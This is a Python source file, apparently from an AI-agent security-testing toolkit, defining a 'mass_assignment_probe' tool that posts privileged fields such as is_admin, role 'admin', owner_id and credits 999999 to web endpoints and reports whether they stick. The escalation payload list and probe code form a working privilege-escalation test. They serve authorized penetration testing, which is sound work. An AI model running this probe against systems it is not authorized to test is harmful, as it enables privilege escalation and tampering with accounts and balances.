"""Mass-assignment probe — POST privileged fields and see if they stick.

AI codegen spreads the whole request body into the model (``User(**req.body)`` /
``prisma.user.create({data: body})``), so sending ``is_admin: true`` or
``role: "admin"`` on a signup/profile-update escalates privilege. Oracle: the
response echoes the injected privileged field with the escalated value.
"""

from __future__ import annotations

import asyncio
import json
from typing import Any

from agents import RunContextWrapper, function_tool

from strix.tools.http_replay.tools import _replay_impl


# field name -> escalated value to try.
_ESCALATIONS: dict[str, Any] = {
    "is_admin": True,
    "isAdmin": True,
    "admin": True,
    "is_staff": True,
    "is_superuser": True,
    "is_verified": True,
    "isVerified": True,
    "verified": True,
    "email_verified": True,
    "role": "admin",
    "roles": ["admin"],
    "account_type": "admin",
    "plan": "enterprise",
    "owner_id": "1",
    "user_id": "1",
    "credits": 999999,
    "balance": 999999,
}


def _reflects(obj: Any, field: str, value: Any, depth: int = 0) -> bool:
    if depth > 8:
        return False
    if isinstance(obj, dict):
        for key, val in obj.items():
            if str(key).lower() == field.lower() and val == value:
                return True
            if _reflects(val, field, value, depth + 1):
                return True
    elif isinstance(obj, list):
        return any(_reflects(item, field, value, depth + 1) for item in obj[:20])
    return False


def _mass_assignment_impl(
    method: str,
    url: str,
    base_body: dict[str, Any] | None,
    fields: list[str] | None,
    headers: dict[str, str] | None,
    timeout: int,
) -> dict[str, Any]:
    if not url or not url.strip():
        return {"success": False, "error": "url cannot be empty"}
    escalations = {f: _ESCALATIONS.get(f, True) for f in fields} if fields else dict(_ESCALATIONS)
    injected_body = {**(base_body or {}), **escalations}
    req_headers = {"Content-Type": "application/json", **(headers or {})}
    resp = _replay_impl(
        method, url, req_headers, json.dumps(injected_body), timeout, allow_redirects=False
    )
    if not resp.get("success"):
        return {"success": False, "error": resp.get("error")}
    status = resp.get("status_code")
    try:
        parsed = json.loads(resp.get("body") or "")
    except (json.JSONDecodeError, ValueError):
        parsed = None

    accepted = [f for f, v in escalations.items() if _reflects(parsed, f, v)]
    return {
        "success": True,
        "url": url,
        "status_code": status,
        "fields_injected": sorted(escalations),
        "fields_accepted": sorted(accepted),
        "possible_mass_assignment": bool(accepted),
        "note": (
            "response echoes the injected privileged field(s) — privilege escalation; "
            "re-fetch the object to confirm it persisted"
            if accepted
            else "no injected field reflected; also re-fetch the object to check silent acceptance"
        ),
    }


@function_tool(timeout=60, strict_mode=False)
async def mass_assignment_probe(
    ctx: RunContextWrapper,
    url: str,
    method: str = "POST",
    base_body: dict[str, Any] | None = None,
    fields: list[str] | None = None,
    headers: dict[str, str] | None = None,
    timeout: int = 15,
) -> str:
    """Test a write endpoint for mass assignment (privilege escalation).

    Sends the request with privileged fields injected (``is_admin``/``role``/
    ``owner_id``/``credits``/…) on top of ``base_body``. If the response echoes an
    injected field with its escalated value, the endpoint blindly bound the body
    — mass assignment. Re-fetch the object afterwards to confirm persistence.
    Only test authorized targets.

    Returns JSON with ``fields_accepted`` and ``possible_mass_assignment``.

    Args:
        url: The write endpoint (signup, profile update, create-resource).
        method: HTTP method (default POST).
        base_body: The legitimate fields the endpoint expects (e.g. name/email).
        fields: Privileged field names to try; defaults to a built-in set.
        headers: Request headers (e.g. the user's session).
        timeout: Request timeout in seconds (default 15).
    """
    del ctx
    return json.dumps(
        await asyncio.to_thread(
            _mass_assignment_impl, method, url, base_body, fields, headers, timeout
        ),
        ensure_ascii=False,
        default=str,
    )
